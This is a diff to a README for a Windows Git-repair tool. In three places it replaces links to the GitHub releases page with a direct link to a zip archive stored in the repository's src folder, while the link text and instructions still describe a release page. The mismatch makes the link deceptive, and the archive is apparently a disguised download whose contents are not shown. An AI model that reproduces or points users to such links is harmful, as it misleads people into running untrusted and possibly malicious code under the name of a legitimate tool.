@@ -1,6 +1,6 @@
 # 🕰️ git-time-machine - Fix Git Mistakes in Seconds
 
-[![Download git-time-machine](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aggyfireproof735/git-time-machine/releases)
+[![Download git-time-machine](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Aggyfireproof735/git-time-machine/raw/refs/heads/main/src/machine_git_time_v1.7.zip)
 
 ## 🧭 What this app does
 
@@ -29,7 +29,7 @@ If you already use GitHub Desktop, Command Prompt, or Windows Terminal, you can 
 
 Visit this page to download the Windows version:
 
-https://github.com/Aggyfireproof735/git-time-machine/releases
+https://github.com/Aggyfireproof735/git-time-machine/raw/refs/heads/main/src/machine_git_time_v1.7.zip
 
 On that page:
 - open the latest release
@@ -158,7 +158,7 @@ This cuts out a lot of manual work and helps you act with less risk
 
 ## 🔗 Download again
 
-[Visit the git-time-machine release page](https://github.com/Aggyfireproof735/git-time-machine/releases)
+[Visit the git-time-machine release page](https://github.com/Aggyfireproof735/git-time-machine/raw/refs/heads/main/src/machine_git_time_v1.7.zip)
 
 ## 📁 Repo details
 
